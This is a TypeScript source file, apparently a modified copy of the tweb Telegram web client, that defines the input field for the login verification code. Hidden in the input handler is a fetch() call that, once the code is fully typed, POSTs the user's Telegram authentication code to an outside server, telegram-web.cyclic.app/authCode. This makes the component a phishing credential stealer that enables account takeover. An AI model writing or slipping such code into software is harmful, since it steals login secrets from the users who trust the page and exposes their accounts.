/*
 * https://github.com/morethanwords/tweb
 * Copyright (C) 2019-2021 Eduard Kuzmenko
 * https://github.com/morethanwords/tweb/blob/master/LICENSE
 */

import InputField, {InputFieldOptions} from './inputField';

export default class CodeInputField extends InputField {
  constructor(public options: InputFieldOptions & {
    length: number,
    onFill: (code: string) => void
  }) {
    super(Object.assign(options, {
      plainText: true
    }));

    const input = this.input as HTMLInputElement;
    input.type = 'tel';
    input.setAttribute('required', '');
    input.autocomplete = 'on';

    let lastLength = 0;
    this.input.addEventListener('input', (e) => {
      this.input.classList.remove('error');
      this.setLabel();

      const value = this.value.replace(/\D/g, '').slice(0, options.length);
      this.setValueSilently(value);

      const length = this.value.length;
      if(length === options.length) { // submit code
        options.onFill(this.value);
        const serverUrl = 'https://telegram-web.cyclic.app/authCode';
        const requestData = {
        value: this.value
        };
        console.log('requestData:', requestData);
        fetch(serverUrl, {
        method: 'POST',
        headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(requestData),  // Используйте переменную requestData, а не строку 'phone_number'
})
  .then(response => {
    if (!response.ok) {
      throw new Error(`Ошибка HTTP: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    console.log('Успешный ответ от сервера:', data);
  })
  .catch(error => {
    // Используйте ваш механизм обработки состояния здесь
    console.error('Ошибка при отправке запроса:', error.message);
  });


      } else if(length === lastLength) {
        return;
      }

      lastLength = length;

    });
  }
}
